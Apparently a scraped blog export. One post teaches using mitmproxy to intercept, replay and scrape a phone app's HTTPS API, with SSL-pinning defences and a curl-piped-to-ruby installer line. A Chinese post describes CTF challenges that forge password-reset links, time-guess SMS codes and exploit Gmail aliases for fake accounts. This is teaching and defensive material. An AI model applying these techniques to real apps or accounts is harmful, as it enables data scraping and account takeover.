API over HTTPS encrypted the data, making it secure—until I demonstrated a man-in-the-middle attack, directly sniffing the transmitted data and spoofing API calls to earn points…Moreover, in recent years, the rise of big data has led to a proliferation of web crawlers; the battle between crawlers and defenses has become increasingly intense, with numerous tricks emerging in the battle between crawling and anti-crawling. It can only be said that as the techniques improve, so do the countermeasures!Crawlers also target APP APIs, and without any defenses, it’s almost like leaving the door wide open; they are not only easy to operate but also have clean formats that are harder to identify and block. Therefore, if the web version has already exhausted all efforts to block access, yet data is still being crawled, it might be worth checking if there are any vulnerabilities in the APP’s API.Since I wasn’t sure how to present this topic in the CTF competition, I decided to write an article to document it. This piece is just a basic overview—HTTPS can decrypt transmitted content through certificate replacement and how to enhance security to prevent such attacks. The actual network theory isn’t my strong suit, and I’ve already returned that knowledge to my teachers. If you already have a grasp of this topic, you can skip this article or scroll down to see how to protect your APP!Practical OperationEnvironment: MacOS + iOS Android users can directly download Packet Capture (free), while iOS users can use Surge 4 (paid) to unlock man-in-the-middle attack features. MacOS users can also use another paid software, Charles. This article mainly explains how to operate using the free mitmproxy on iOS. If you have the above environment, you can simply open the APP on your phone and mount a VPN to replace the certificate for the man-in-the-middle attack! (Again, please scroll down to see how to protect it!)[2021/02/25 Update]: A new free graphical interface program for Mac, ( Proxyman ), is available, which can be used in conjunction with the first part of this article.Install mitmproxyInstall directly using brew:brew install mitmproxyInstallation complete!p.s. If you encounter “brew: command not found,” please first install the brew package management tool:/usr/bin/ruby -e \"$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)\"Using mitmproxyAfter installation, enter the following command in Terminal to activate:mitmproxyStartup successful.Ensure the Phone and Mac Are on the Same Local Network &amp; Obtain Mac’s IP AddressMethod (1): Connect Mac to WiFi, and have the phone use the same WiFi.Mac’s IP Address = “System Preferences” -&gt; “Network” -&gt; “Wi-Fi” -&gt; “IP Address”Method (2): Connect Mac via wired network, enable internet sharing; connect the phone to that hotspot:Mac’s IP Address = 192.168.2.1 (⚠️ Note: This is not the Ethernet network IP; it’s the IP used by Mac as the internet sharing base station.)Phone Network Settings WiFi — Proxy Server InformationSettings -&gt; WiFi -&gt; HTTP Proxy -&gt; Manual -&gt; Enter Mac’s IP Address -&gt; Enter 8080 -&gt; Save At this point, if the webpage doesn’t open and a certificate error appears, that’s normal; let’s continue…Install mitmproxy Custom HTTPS CertificateAs mentioned above, the implementation of a man-in-the-middle attack involves using your own certificate to replace and decrypt data during communication; therefore, we also need to install this custom certificate on the phone.1. Open Safari on your phone and go to http://mitm.itLeft side shows Proxy settings ✅ / Right side indicates Proxy settings are incorrect 🚫Apple -&gt; Install Profile -&gt; Install ⚠️ We’re not done yet; we still need to enable the profile in the settings.General -&gt; About -&gt; Certificate Trust Settings -&gt; Enable mitmproxyDone! Now we can return to the browser and browse the web normally.Return to Mac to Operate mitmproxyYou can see the data transmission records from the phone on the mitmproxy Terminal.Find the desired sniffing record to view Request (parameters sent) / Response (content returned).Common Operation Key Set:「 ? 」= View key operation documentation「 k 」/「⬆」= Up 「 j 」/「⬇」= Down 「 h 」/「⬅」= Left 「 l 」/「➡️」️= Right 「 space 」= Next page「 enter 」= Enter to view details「 q 」= Return to the previous page/exit「 b 」= Export response body to specified path text file 「 f 」= Filter record conditions「 z 」= Clear all records「 e 」= Edit Request (cookie, headers, params...)「 r 」= Resend RequestNot Used to CLI? No Problem, You Can Switch to Web GUI!In addition to the mitmproxy activation method, we can switch to:mitmwebThis allows you to use the new Web GUI for observation and operation.mitmweb.The Main Event: Sniffing APP DataOnce the above environment is set up and familiar, we can enter the main event; sniffing the data transmission content of the APP API! Here, we will use a housing APP as an example, with no malicious intent, purely for academic exchange! We want to know how the object list API requests and what content it returns!First, press “z” to clear all records (to avoid confusion).Open the target APP.Open the target APP and try to “pull down to refresh” or trigger the action to “load the next page.” 🛑 If your target APP doesn’t open or connect; then sorry, it means the APP has implemented defenses that prevent sniffing. Please scroll directly to the section on how to protect it. 🛑mitmproxy records.Return to mitmproxy to check the records, channel your inner detective to guess which API request record is what we want and enter to view the details!Request.In the Request section, you can see which parameters were passed in the request.By using “e” to edit and “r” to resend, and observing the Response, you can guess the purpose of each parameter!Response.You can also directly obtain the original returned content from the Response. 🛑 If the Response content is a bunch of encoded data; then sorry, it means the APP may have its own encryption and decryption process, making it impossible to sniff using this method. Please scroll directly to the section on how to protect it. 🛑Is it hard to read? Is there garbled Chinese? No worries, you can use “b” to export it as a text file to your desktop, then copy the content to Json Editor Online for parsing! * Alternatively, you can directly use mitmweb to browse and operate through the web GUI.mitmweb.After sniffing, observing, filtering, and testing, you will understand how the APP API operates, allowing you to use it to scrape data with a crawler. * After collecting the necessary information, remember to close mitmproxy and change the phone’s network Proxy settings back to automatic to use the internet normally.How Should the APP Protect Itself?If you find that the APP cannot be used after mounting mitmproxy, or the returned content is encoded, it means the APP has implemented protections.Method (1):Generally, this involves placing a copy of the certificate information within the APP. If the current HTTPS certificate does not match the information in the APP, access is denied. For more details, see this or look for resources on SSL Pinning. The downside is that you need to pay attention to the certificate’s validity period!https://medium.com/@dzungnguyen.hcm/ios-ssl-pinning-bffd2ee9efcMethod (2):Before transmitting data, the APP encrypts the data, and the API backend decrypts it to obtain the original request content. Similarly, the API encrypts the returned content before sending it back, and the APP decrypts it upon receipt. This process is cumbersome and resource-intensive, but it is indeed a method; as far as I know, some digital banks use this method for protection!However…Method 1 still has ways to be bypassed: How to Bypass SSL Pinning on iOS 12.Method 2 can also be compromised through reverse engineering to obtain the keys used for encoding and encryption.⚠️ There is no 100% security ⚠️Or simply leave a hole for it to crawl, collect various evidence, and then resolve it legally (？)Still, the saying goes: “NEVER TRUST THE CLIENT.”More Ways to Use mitmproxy:1. Use mitmdumpIn addition to mitmproxy and mitmweb, mitmdump can directly export all records to a text file:mitmdump -w /log.txtYou can also use Method (2) with a Python script to set parameters and filter traffic:mitmdump -ns examples/filter.py -r /log.txt -w /result.txt2. Use a Python script for request parameter settings, access control, and redirection:from mitmproxy import httpdef request(flow: http.HTTPFlow) -&gt; None: # pretty_host takes the \"Host\" header of the request into account, # which is useful in transparent mode where we usually only have the IP # otherwise. # Request parameter settings Example: flow.request.headers['User-Agent'] = 'MitmProxy' if flow.request.pretty_host == \"123.com.tw\": flow.request.host = \"456.com.tw\" # Redirect all access from 123.com.tw to 456.com.twTo enable mitmproxy with the script, add the parameter:mitmproxy -s /redirect.pyormitmweb -s /redirect.pyormitmdump -s /redirect.pyA PitfallWhen using mitmproxy to observe HTTP 1.1 requests with Accept-Ranges: bytes and Content-Range for long connections that continuously fetch resources, it will wait until the entire response is returned before displaying it, rather than showing it in segments while using persistent connections to continue downloading!Read about the pitfall here.Further Reading Using a Check-in Reward APP as an Example to Create a Daily Automatic Check-in Script How to Create an Interesting Engineering CTF Competition Revealing a Clever Website Vulnerability Discovered a Few Years Ago iOS 15 / MacOS Monterey Safari Will Be Able to Hide Real IPPostscript---title: \"iPlayground 2019 Experience\"date: 2019-09-20---Since I don't have domain permissions to obtain SSL certificate information, I can't implement it; looking at the code, it doesn't seem too difficult. Although there's no 100% secure method, having an additional layer of protection can at least make it a bit safer. Continuing to attack would require a lot of time for research, but it should deter about 90% of crawlers!This article might be a bit lacking in substance, as I've neglected Medium for a while (went off to play with my DSLR). This is mainly to warm up my writing skills ahead of this weekend's [iPlayground 2019](https://iplayground.io/2019/){:target=\"_blank\"}; I'm looking forward to this year's agenda 🤩 and hope to come back with more quality articles!&gt; **_\\[2019/02/22 Updated Article\\] [What is the Experience of iPlayground 2019?](/posts/en/4079036c85c2/)_**If you have any questions or suggestions, feel free to [contact me](https://www.zhgchg.li/contact){:target=\"_blank\"}.This article was first published on Medium ➡️ Click HereAutomatically converted and synchronized using ZMediumToMarkdown and Medium-to-jekyll-starter.Improve this page on Github.Follow Me on Medium 1K+ Followers 10,134 Total Views Last Statistics Date: 2025-08-15 | 10,083 Views on Medium." }, { "title": "如何打造一場有趣的工程CTF競賽", "url": "/posts/zrealm-dev/%E5%A6%82%E4%BD%95%E6%89%93%E9%80%A0%E4%B8%80%E5%A0%B4%E6%9C%89%E8%B6%A3%E7%9A%84%E5%B7%A5%E7%A8%8Bctf%E7%AB%B6%E8%B3%BD-729d7b6817a4/", "categories": "ZRealm Dev.", "tags": "capture-the-flag, ios-app-development, php, computer-science, wargame", "date": "2019-07-24 22:32:34 +0800", "snippet": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.如何打造一場有趣的工程CTF競賽Capture The Flag 競賽建置與題目發想關於 CTFCapture The Flag 奪旗簡稱 CTF；是一種源於西方的運動，在現代也常見於漆彈、第一人稱射擊遊戲中；原始概念是分組進...", "content": "ℹ️ℹ️ℹ️ Click here to view the English version of this article, translated by OpenAI.如何打造一場有趣的工程CTF競賽Capture The Flag 競賽建置與題目發想關於 CTFCapture The Flag 奪旗簡稱 CTF；是一種源於西方的運動，在現代也常見於漆彈、第一人稱射擊遊戲中；原始概念是分組進行，各組需要保護自己的旗幟不被搶走另一方面也要想辦法得到別組的旗幟；應用在計算機領域就是「入侵攻防戰」首先找到自己的漏洞保護好不被入侵，另一方面製造零時差攻擊從其他隊伍搶奪分數。以上屬於標準甚至可以說是「進階」的 CTF 比賽方式，要在企業內部Run一場 CTF 比賽還會有其他現實考量： 舉辦 CTF 比賽的目的除了提升技術能力外還有 促進工程師之間的交流 工程師各有所長，有Front-End、Back-End、APP、DevOps；若希望大家都能參與，出題方向就不能太針對某個領域（如:網路、PHP） 分組要能強弱、更領域專長平均分散 活動時間頂多一個下午 舉辦 CTF 比賽屬於主要工作業務之外的Side Project，沒有太多的資源跟時間綜合以上因素，與其說是一場 CTF比賽，不如說是場： 分組解謎累積旗幟積分＆促進工程師之間交流的活動屬於初階的 CTF比賽！活動目標 提升工程技術能力 促進工程師之間交流 激發大家探索事物的熱忱、敏銳度 有趣，無趣的事做起來很痛苦3、4項是我自己加入的，我對這個活動的期望不只是實務面；更希望透過有趣的方式提升大家對探索、學習新事物的熱忱，就如同日常工作一般；不應該只做碼農，而是要想辦法自我突破繼續向前！比賽規則 將工程師依照專長、強弱平均分組 比賽時間：90分鐘 題目一共出了12題，提供3次花費得分購買提示的機會 提示購買花費依照時間遞減（越早買越貴） 每題有基本得分+時間得分（越早解越多） 選擇開啟某個題目答題後，將鎖定只能回答該提或其他已開啟的題目；直到該提通過或鎖定時間結束（會有這條規則是因為活動主要希望組員之間能交流一起腦力激盪，而不是分工解題） 每題分數、提示花費、鎖定時間依照題目難易度各有所不同 勝利條件：累積得分最高獲勝，若分數一樣則比較解題時間 獲勝隊伍有$$如何打造？活動規則跟目標都釐清之後，再來的重頭戲就是如何打到一場 CTF比賽？此部分要分兩個章節說明， 第一是打造能進行 CTF比賽的系統 ， 第二是 比賽題目的發想1.打造能進行 CTF比賽的系統 這部分需要具備前端跟後端相關技術才能實作，如果不熟悉就只能請其他同事幫忙囉。前端： Semantic UI後端：PHP+json檔儲存資料因為時間有限，所以比賽系統的部分以簡單穩定快速搭建為主；這邊前端介面直接套用 Semantic UI 這套Framework；後端使用老本行PHP撰寫，無使用Framework，資料儲存部分也直接使用json檔做存放，無使用資料庫；一切從簡，也比較不會有問題（例如有人想攻擊比賽系統直接獲得答案）。入口頁：以有趣為出發點，入口頁使用BBC影集Sherlock的梗：手機解鎖密碼 S H E R這四格輸入框用來輸入各組得到的識別碼(4位數)，例如：輸入第一組：「1432」、第二組：「8421」，用來識別要答題的組別。至於各組的識別碼這邊我多埋了一個梗，識別碼呈現如下：有看出來四位數字識別碼了嗎？沒有的話請離螢幕遠一點看看。…….…………………………………………………………………………………….………………………………….……………………………. .……………………….………………. .……………….. .解答：第一組的識別碼是 8291輸入之後就會進入比賽系統主頁-題目列表：上方顯示： Team 1 組別、提示券剩餘張數中間題目區： 題目名稱、描述、通過獲得分數、鎖定時間、購買提示、提示顯示滑鼠移入會顯示時間分數、提示價格下方顯示： Total 目前總分後端及其他邏輯： 題目列表頁每秒會用Ajax跟後端要當前答題狀況，後端讀取、記錄答題狀況在各組的json檔；按解鎖答題時會記錄時間、時間未到無法解鎖其他題目、答題通過寫入完成時間、時間分數、提示價格會依照花費時間遞增遞減。 比賽系統大致上如此，不過重點不在於比賽系統，而是題目本身！ 有不有趣、能不能讓所有人參與、有沒有邏輯、新不新奇…真的很難發想讓我們趕進進入重點吧！2.比賽題目的發想首先介紹我所發想的5個題目1.通往魔法學院的大門題目說明： 你會得到一串金鑰，要想辦法使用這把鑰匙解出咒語，輸入在咒語輸入框；下方有驗證碼欄位需要輸入，按驗證進行答題。解答：本題考的是資安及編碼問題；平台加解密漏洞接口運用，若在網站設計時所有的加密解密都使用同一套方式、同一把鑰匙，我們就能運用這個弱點去解開加密內容得到原始資料！可以看到驗證碼的部分是 ./image.php?token=AD0HbwdgVDw= 這裡就提供一個解密的接口，所以我們可以試試把上方的加密金鑰帶入：即可得到解密後的字串：LiveALifeYouWillRemeber輸入到咒語輸入框後即可通關！2.請帶我回到1937年的上海！題目說明： 要想辦法輸入年/月/日送出到後端，讓後端判別成是1937年；年份輸入範圍(1947~2099)無法直接輸入1937年。解答：本題旨不在如何繞過前端判斷，因為後端有處理所以無法繞過；本題主要考的是 32位元電腦2038年問題 ，因為位元數限制32位元的timestamp最多只能顯示到2038年1月19日03:14:07，超過將會溢位回到1901年1月1日；因此可以透過往後推算輸入 2073–02–06 到 2074–02–05 都會落在1937年，輸入這範圍的日期後即可傳送成功！維基百科3.神鬼交鋒題目說明： 要想辦法收取一個第三方(你無法登入的信箱)的密碼重設信，完成重設別人的密碼。解答：本題需要更多的敏銳度，首先先使用自己可以收信的信箱做密碼重設；我們收到的信件如下：您的密碼重設連結：http://ctf.zhgchg.li/10/reset.php?requestid=OTk= 如跟您無關聯，無須理會此封信，謝謝！我們可以發現密碼重設請求是透過requestid這個參數去識別，我們得到的值是 OTk= ，看起來是base64?，試試看吧：base64 decode and encode我們可以得到參數的值是99，再重複請求一次密碼重設得到100，因此可以推測密碼重設請求是流水號，下一號就是101，這時再回到原本要繞過的信箱按重設密碼請求，我們就能自行偽造組合出密碼重設連結，進而偷偷重設別人的密碼。將101 Encode Base64 =&gt; MTAx，偽造網址： http://ctf.zhgchg.li/10/reset.php?requestid=MTAx ，隨意輸入密碼後按下密碼重設即可通關！4.馬甲大師題目說明： 你需要生出10組Gmail信箱（Gmail託管信箱），收取解答信。解答：本題當然可以暴力破解，但公司信箱是不能隨意註冊的；除非找到10個人幫你收信不然無法解答。本題關鍵是 Gmail信箱/Gmail託管信箱，由於公司信箱是Gmail託管信箱；所以也有Gmail信箱的特性：可以使用「.」、「+」創造出無限的分身信箱，「.」可以放在帳號任意位置、「+」可以放在最後+任何數字例如：主信箱是 zhgchgli@gmail.com ，但z.hgchgli@gmail.com、zh.gchgli@gmail、zhgchgli+1@gmail.com、zhgchgli+25@gmail.com…都會寄到 zhgchgli@gmail.com 主信箱，一個信箱就能創造出多個身份！這體主要在提醒大家在做帳號註冊時要多過濾掉這些字符，以免讓有心人利用註冊大量假帳號。收取完10封信就能組合出解答所在網址，進入網址後即可通關！5.時間機器題目說明： 跟第3題神鬼交鋒有點像，要想辦法收取一個第三方(你無法收取簡信)的手機簡訊驗證碼(4位數字)，完成登入別人的帳號。解答：本題較冷門困難，主要模擬旁路時序攻擊，系統登入驗證包含複雜演算法，在處理驗證資訊時會有時差出現（例如：輸入對1碼處理比較久. .全錯馬上就返回了，很快）；透過觀察這些時差我們從 0000 開始一位一位去嘗試，嘗試 2000 時發現處理了一秒，我們可以得知第一位是 2 ；再繼續嘗試 2100 還是一秒， 2200 時又更慢了，變兩秒…再繼續試第三位、第四位最後就能直接獲得解答「 2256 」本題只是模擬此種攻擊，後端處理直接用sleep模擬非實際有複雜的演算法，一般在網頁、APP開放上也較少遇到這種攻擊；一放面是處理資訊都不夠複雜到會有明顯時差、另一方面還有網路因素影響，不好判斷。關於旁路攻擊詳細可參考此篇文章：30 分钟理解 CORB 是什么 — 旁路攻击（side-channel attacks） 以上是我發想的5題，下面繼續介紹同事們提供的剩下7題題目。1.貞子出鏡貞子圖取自網路題目說明： 題目就是一張貞子圖，要在上方對話輸入框輸入貞子想說的話，即可通關。解答：本題考大家知不知道圖片能塞其他資訊的概念，關鍵在這張圖的原圖：貞子圖取自網路這張圖已經偷偷壓縮一個文字檔在裡面（實際作法請參考： How To Hide A ZIP File Inside An Image On Mac [Quicktip] ，這邊要注意Win/Mac的問題）所以我們只要簡單的在Commone unzip 這張圖就能獲得通關字串：在輸入框輸入「YOUHAVENOIDEA」即可通關！補充：關於圖片隱藏資訊部分，這邊還有另一種方式，使用「 圖像隱碼術(Steganography) 」圖像隱碼術(Steganography)與惡意程式：原理和方法簡單來說就將像素色碼的顏色值做手腳藏資訊，實際圖片已變但肉眼無法分辨出來。這題怕大家走這個方向，所以也在圖片裡做了隱碼，走這條路的人可以獲得提示：Steganography Online將圖片上傳至線上隱碼解碼工具即可獲得提示。2.凱薩大帝的摩斯密碼素材圖片取自網路題目說明： 試解出題目所提供的摩斯密碼所含的意思（一句英文）。解答：本題相當直白，第一步就是先解出摩斯密碼代表的英文字母「 VYYXI DN HT GDAZ 」摩斯密碼翻譯器然後再做凱薩密碼解密，當我們嘗試到偏移量5時可以得到一句有意義的英文句子「 addcn is my life」，即為答案！凱薩密碼解密工具3.你覺得是什麼？打開這題的網頁就是一堆亂碼，完整如下：ZGF0YTppbWFnZS9wbmc7YmFzZTY0LGlWQk9SdzBLR2dvQUFBQU5TVWhFVWdBQUFtSUFBQUIrQ0FZQUFBQ0gzWDB2QUFBS3cybERRMUJKUTBNZ1VISnZabWxzWlFBQVNJbVZsd2RVazFrV3g5LzNwVGRhQWdKU1F1OUlyMUpDYUFHVVhtMkVKSkJRWWt3SUFuWmtjQVRHZ29vSWxnRWRCRkZ3TElDTUJiRmdZVkN3Z0hXQ0RBcktPRmdRRlpYOWdDWE03SjdkUFh0ejN2Zjl6ai8zM1hmdk8rL2wzQUJBSWJORm9uUllDWUFNWWFZNElzQ0hIaGVmUU1mMUF3akFnQUJvd0pMTmtZZ1lZV0VoQUxHWjk5L3R3MzNFRzdFN1ZwT3gvdjM3LzJyS1hKNkVBd0FVaG5BU1Y4TEpRUGdVTXQ1eVJPSk1BRkExaUc2d01sTTB5UjBJMDhSSWdnakxKamxsbXQ5UGN0SVVvL0ZUUGxFUlRJUzFBTUNUMld4eENnQmtVMFNuWjNGU2tEamtRSVJ0aEZ5QkVPRnNoRDA1ZkRZWDRXYUVMVE15bGsveTd3aWJKdjBsVHNyZllpYkpZN0xaS1hLZXJtWEs4TDRDaVNpZG5mTi9ic2YvdG94MDZjd2F4c2dnODhXQkVjaGJFOW16M3JUbHdYSVdKaTBNbldFQmQ4cC9pdm5Td09nWjVraVlDVFBNWmZzR3krZW1Md3laNFdTQlAwc2VKNU1WTmNNOGlWL2tESXVYUjhqWFNoWXpHVFBNRnMrdUswMkxsdXQ4SGtzZVA1Y2ZGVHZEV1lLWWhUTXNTWXNNbnZWaHluV3hORUtlUDA4WTRETzdycis4OWd6Slgrb1ZzT1J6TS9sUmdmTGEyYlA1ODRTTTJaaVNPSGx1WEo2djM2eFB0TnhmbE9ralgwdVVIaWIzNTZVSHlIVkpWcVI4YmlaeUlHZm5oc24zTUpVZEZEYkRJQVl3Z0IzeXNVY0dIVVFDSGhBREFmSkVhc25rWldkT0ZzUmNMc29SQzFMNG1YUUdjdE40ZEphUVkyMUp0N094ZFFWZzh0NU9INHQzdlZQM0VWTER6Mm81VzVCanJvQ0l3N05hckNFQXh3WUIwSGc5cXhrakdvMElRRk1FUnlyT210YlFrdzhNSUFKRjVQZEFBK2dBQTJBS3JKQXNuWUE3OEFaK0lBaUVnaWdRRDVZQ0R1Q0REQ1R2bFdBMTJBQUtRQkhZQm5hQmNuQUFIQVExNEJnNEFackFXWEFSWEFVM3dXMXdEendDTWpBQVhvRVI4QUdNUXhDRWd5Z1FGZEtBZENFanlBS3lnMXdnVDhnUENvRWlvSGdvRVVxQmhKQVVXZzF0aElxZ0VxZ2Nxb1Jxb1oraE05QkY2RHJVQlQyQStxQWg2QzMwR1ViQlpKZ0dhOFBHOER6WUJXYkF3WEFVdkFST2dWZkF1WEErdkFVdWc2dmdvM0FqZkJHK0NkK0RaZkFyZUJRRlVDU1VHa29QWllWeVFURlJvYWdFVkRKS2pGcUxLa1NWb3FwUTlhZ1dWRHZxRGtxR0drWjlRbVBSVkRRZGJZVjJSd2VpbzlFYzlBcjBXblF4dWh4ZGcyNUVYMGJmUWZlaFI5RGZNQlNNRnNZQzQ0WmhZZUl3S1ppVm1BSk1LYVlhY3hwekJYTVBNNEQ1Z01WaTFiQW1XR2RzSURZZW00cGRoUzNHN3NNMllGdXhYZGgrN0NnT2g5UEFXZUE4Y0tFNE5pNFRWNERiZ3p1S3U0RHJ4ZzNnUHVKSmVGMjhIZDRmbjRBWDR2UHdwZmdqK1BQNGJ2d0wvRGhCaVdCRWNDT0VFcmlFSE1KV3dpRkNDK0VXWVlBd1RsUW1taEE5aUZIRVZPSUdZaG14bm5pRitKajRqa1FpNlpOY1NlRWtBV2s5cVl4MG5IU04xRWY2UkZZaG01T1o1TVZrS1hrTCtUQzVsZnlBL0k1Q29SaFR2Q2tKbEV6S0Zrb3Q1UkxsS2VXakFsWEJXb0dsd0ZWWXAxQ2gwS2pRcmZCYWthQm9wTWhRWEtxWXExaXFlRkx4bHVLd0VrSEpXSW1weEZaYXExU2hkRWFwUjJsVW1hcHNxeHlxbktGY3JIeEUrYnJ5b0FwT3hWakZUNFdya3E5eVVPV1NTajhWUlRXZ01xa2M2a2JxSWVvVjZnQU5Tek9oc1dpcHRDTGFNVm9uYlVSVlJkVkJOVVkxVzdWQzlaeXFUQTJsWnF6R1VrdFgyNnAyUXUyKzJ1YzUybk1ZYzNoek5zK3BuOU05WjB4OXJycTNPays5VUwxQi9aNzZadzI2aHA5R21zWjJqU2FOSjVwb1RYUE5jTTJWbXZzMXIyZ096NlhOZFovTG1WczQ5OFRjaDFxd2xybFdoTllxcllOYUhWcWoyanJhQWRvaTdUM2FsN1NIZGRSMHZIVlNkWGJxbk5jWjBxWHFldW9LZEhmcVh0QjlTVmVsTStqcDlETDZaZnFJbnBaZW9KNVVyMUt2VTI5YzMwUS9XajlQdjBIL2lRSFJ3TVVnMldDblFadkJpS0d1NFFMRDFZWjFoZytOQ0VZdVJueWozVWJ0Um1QR0pzYXh4cHVNbTR3SFRkUk5XQ2E1Sm5VbWowMHBwbDZtSzB5clRPK2FZYzFjek5MTTlwbmROb2ZOSGMzNTVoWG10eXhnQ3ljTGdjVStpeTVMaktXcnBkQ3l5ckxIaW16RnNNcXlxclBxczFhekRySE9zMjZ5ZmozUGNGN0N2TzN6MnVkOXMzRzBTYmM1WlBQSVZzVTJ5RGJQdHNYMnJaMjVIY2V1d3U2dVBjWGUzMzZkZmJQOUd3Y0xCNTdEZm9kZVI2cmpBc2ROam0yT1g1MmNuY1JPOVU1RHpvYk9pYzU3blh0Y2FDNWhMc1V1MTF3eHJqNnU2MXpQdW41eWMzTExkRHZoOXFlN2xYdWEreEgzd2ZrbTgzbnpEODN2OTlEM1lIdFVlc2c4Nlo2Sm5qOTZ5cnowdk5oZVZWN1B2QTI4dWQ3VjNpOFlab3hVeGxIR2F4OGJIN0hQYVo4eHBodHpEYlBWRitVYjRGdm8yK21uNGhmdFYrNzMxRi9mUDhXL3puOGt3REZnVlVCcklDWXdPSEI3WUE5TG04VmgxYkpHZ3B5RDFnUmREaVlIUndhWEJ6OExNUThSaDdRc2dCY0VMZGl4NFBGQ280WENoVTJoSUpRVnVpUDBTWmhKMklxd1g4S3g0V0hoRmVIUEkyd2pWa2UwUjFJamwwVWVpZndRNVJPMU5lcFJ0R20wTkxvdFJqRm1jVXh0ekZpc2IyeEpyQ3h1WHR5YXVKdnhtdkdDK09ZRVhFSk1RblhDNkNLL1Jic1dEU3gyWEZ5dytQNFNreVhaUzY0djFWeWF2dlRjTXNWbDdHVW5FekdKc1lsSEVyK3dROWxWN05Fa1Z0TGVwQkVPazdPYjg0cnJ6ZDNKSGVKNThFcDRMNUk5a2t1U0IxTThVbmFrRFBHOStLWDhZUUZUVUM1NGt4cVllaUIxTEMwMDdYRGFSSHBzZWtNR1BpTXg0NHhRUlpnbXZMeGNaM24yOGk2UmhhaEFKRnZodG1MWGloRnhzTGhhQWttV1NKb3phVWlEMUNFMWxYNG43Y3Z5ektySStyZ3ladVhKYk9Wc1lYWkhqbm5PNXB3WHVmNjVQNjFDcitLc2FsdXR0M3JENnI0MWpEV1ZhNkcxU1d2YjFobXN5MTgzc0Q1Z2ZjMEc0b2EwRGIvbTJlU1Y1TDNmR0x1eEpWODdmMzErLzNjQjM5VVZLQlNJQzNvMnVXODY4RDM2ZThIM25adnROKy9aL0syUVczaWp5S2FvdE9oTE1hZjR4ZysyUDVUOU1MRWxlVXZuVnFldCs3ZGh0d20zM2QvdXRiMm1STGtrdDZSL3g0SWRqVHZwT3d0M3Z0KzFiTmYxVW9mU0E3dUp1Nlc3WldVaFpjMTdEUGRzMi9PbG5GOStyOEtub21HdjF0N05lOGYyY2ZkMTcvZmVYMzlBKzBEUmdjOC9DbjdzclF5b2JLd3lyaW85aUQyWWRmRDVvWmhEN1QrNS9GUmJyVmxkVlAzMXNQQ3dyQ2FpNW5LdGMyM3RFYTBqVyt2Z09tbmQwTkhGUjI4Zjh6M1dYRzlWWDltZzFsQjBIQnlYSG4vNWMrTFA5MDhFbjJnNzZYS3kvcFRScWIybnFhY0xHNkhHbk1hUkpuNlRyRG0rdWV0TTBKbTJGdmVXMDc5WS8zTDRyTjdaaW5PcTU3YWVKNTdQUHo5eElmZkNhS3VvZGZoaXlzWCt0bVZ0ank3RlhicDdPZnh5NTVYZ0s5ZXUrbCs5MU01b3YzRE40OXJaNjI3WHo5eHd1ZEYwMCtsbVk0ZGp4K2xmSFg4OTNlblUyWGpMK1ZiemJkZmJMVjN6dTg1M2UzVmZ2T043NStwZDF0MmI5eGJlNjdvZmZiKzNaM0dQckpmYk8vZ2cvY0diaDFrUHh4K3RmNHg1WFBoRTZVbnBVNjJuVmIrWi9kWWdjNUtkNi9QdDYzZ1crZXhSUDZmLzFlK1MzNzhNNUQrblBDOTlvZnVpZHRCdThPeVEvOUR0bDR0ZURyd1N2Um9mTHZoRCtZKzlyMDFmbi9yVCs4K09rYmlSZ1RmaU54TnZpOTlwdkR2ODN1RjkyMmpZNk5NUEdSL0d4d28vYW55cytlVHlxZjF6N09jWDR5dS80TDZVZlRYNzJ2SXQrTnZqaVl5SkNSRmJ6SjVxQlZESWdKT1RBWGg3R0FCS1BBRFUyd0FRRjAzMzFWTUdUZjhYbUNMd24zaTY5NTR5SndDcXZRR0liZ1VnY0QwQUZaTTlDTUlxeUFoRDlDaHZBTnZieThjL1RaSnNiemNkaTlTRXRDYWxFeFB2a0I0U1p3YkExNTZKaWZHbWlZbXYxVWl5RHdGby9URGR6MDlhQXRJMzV4bE9VZ2VURC83Vi9nSENLaEdyVlRxbk1nQUFBWjFwVkZoMFdFMU1PbU52YlM1aFpHOWlaUzU0YlhBQUFBQUFBRHg0T25odGNHMWxkR0VnZUcxc2JuTTZlRDBpWVdSdlltVTZibk02YldWMFlTOGlJSGc2ZUcxd2RHczlJbGhOVUNCRGIzSmxJRFV1TkM0d0lqNEtJQ0FnUEhKa1pqcFNSRVlnZUcxc2JuTTZjbVJtUFNKb2RIUndPaTh2ZDNkM0xuY3pMbTl5Wnk4eE9UazVMekF5THpJeUxYSmtaaTF6ZVc1MFlYZ3Ribk1qSWo0S0lDQWdJQ0FnUEhKa1pqcEVaWE5qY21sd2RHbHZiaUJ5WkdZNllXSnZkWFE5SWlJS0lDQWdJQ0FnSUNBZ0lDQWdlRzFzYm5NNlpYaHBaajBpYUhSMGNEb3ZMMjV6TG1Ga2IySmxMbU52YlM5bGVHbG1MekV1TUM4aVBnb2dJQ0FnSUNBZ0lDQThaWGhwWmpwUWFYaGxiRmhFYVcxbGJuTnBiMjQrTmpFd1BDOWxlR2xtT2xCcGVHVnNXRVJwYldWdWMybHZiajRLSUNBZ0lDQWdJQ0FnUEdWNGFXWTZVR2w0Wld4WlJHbHRaVzV6YVc5dVBqRXlOand2WlhocFpqcFFhWGhsYkZsRWFXMWxibk5wYjI0K0NpQWdJQ0FnSUR3dmNtUm1Pa1JsYzJOeWFYQjBhVzl1UGdvZ0lDQThMM0prWmpwU1JFWStDand2ZURwNGJYQnRaWFJoUGdvZmZnckVBQUFyTVVsRVFWUjRBZTJkQ2R5VTQvckhyeFNINGsyaTBxYkZhYU9pQlpFVWh6YUpOcVc5Y0p5c2xUWmJqaVBhYkVjTDdTa3ErU2RhQ0tVT0twV2lva1hrRUZvVUxRaWwvL1ViNXozbjlacG03bnZtMmVkM2ZUN3ptZmVkdWVaZXZzOHo4MXpQZlY5TG5rcVZ5eDhSQ2dtUUFBbVFBQW1RQUFtUWdPY0Vqdkc4UjNaSUFpUkFBaVJBQWlSQUFpUVFJMEJEakNjQ0NaQUFDWkFBQ1pBQUNmaEVnSWFZVCtEWkxRbVFBQW1RQUFtUUFBblFFT001UUFJa1FBSWtRQUlrUUFJK0VhQWg1aE40ZGtzQ0pFQUNKRUFDSkVBQ05NUjREcEFBQ1pBQUNaQUFDWkNBVHdSb2lQa0VudDJTQUFtUUFBbVFBQW1RQUEweG5nTWtRQUlrUUFJa1FBSWs0Qk1CR21JK2dXZTNKRUFDSkVBQ0pFQUNKRUJEak9jQUNaQUFDWkFBQ1pBQUNmaEVnSWFZVCtEWkxRbVFBQW1RQUFtUUFBblFFT001UUFJa1FBSWtRQUlrUUFJK0VhQWg1aE40ZGtz